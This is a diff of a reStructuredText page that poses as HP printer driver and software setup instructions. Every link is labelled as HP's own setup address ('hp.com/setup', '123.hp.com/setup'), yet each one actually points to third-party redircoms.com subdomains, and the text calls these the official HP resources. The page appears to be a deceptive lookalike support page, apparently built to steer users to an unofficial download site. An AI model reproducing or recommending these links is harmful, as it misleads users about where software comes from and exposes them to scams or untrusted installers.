@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+Find HP printer software, drivers, apps, and updates
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: E181B8BDF2CB760DDE8EC625F4AC6BB4
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: DOWNLOAD-PRINTER-DRIVER.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: 123.hp.com/setup
+      :target: https://hs.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,43 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+Setting up your HP printer or keeping it up to date is simple with the right tools. Whether you’ve just unboxed a new device or are troubleshooting an existing one, everything you need—from software and drivers to mobile apps and firmware—is available in one place. Start by visiting `123.hp.com/setup <https://hs.redircoms.com>`_ to download the latest resources for your specific HP printer model.
 
-**********
-Steps to Download HP Printer Driver
-**********
+What You Can Find at 123.hp.com/setup
+--------------------------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+At `123.hp.com/setup <https://hs.redircoms.com>`_, HP provides essential tools to help you:
 
-2. Enter your HP printer model in the search box.
+- Download and install printer drivers
+- Access setup instructions tailored to your model
+- Install HP Smart app for mobile printing and scanning
+- Get automatic software and firmware updates
+- Troubleshoot common issues
 
-3. Select your operating system if prompted.
+Step-by-Step: Get What You Need
+-------------------------------
 
-4. Click on **Download** to get the latest driver and software package.
+**1. Identify Your Printer Model**  
+Check the model name or number on your HP printer. You’ll need this to download the correct software and drivers.
 
-5. Save the installer file to your computer.
+**2. Visit the Official Setup Page**  
+Open your browser and go to `123.hp.com/setup <https://hs.redircoms.com>`_. Enter your model in the search bar.
 
-**********
-Steps to Install HP Printer Driver
-**********
+**3. Download Drivers and Software**  
+Once your printer is detected, you’ll be offered the most recent drivers, utilities, and software that are compatible with your system.
 
-1. Locate the downloaded installer file on your computer.
+**4. Install the HP Smart App (Optional but Recommended)**  
+HP Smart is a convenient app that lets you print, scan, and manage your printer directly from your smartphone, tablet, or PC.
 
-2. Double-click the installer to begin the setup process.
+**5. Run Updates and Complete Setup**  
+After installing the software, allow the tool to check for the latest updates. Follow on-screen prompts to complete the installation and run a test print.
 
-3. Follow the on-screen instructions and accept the license agreement.
+Why Use Official HP Resources?
+-------------------------------
 
-4. Choose your connection type (USB or Wireless).
+Using tools from `123.hp.com/setup <https://hs.redircoms.com>`_ ensures:
 
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+- Your drivers are up to date and secure  
+- Compatibility with the latest operating systems  
+- Access to new features via firmware and app updates  
+- Full support for mobile and wireless printing
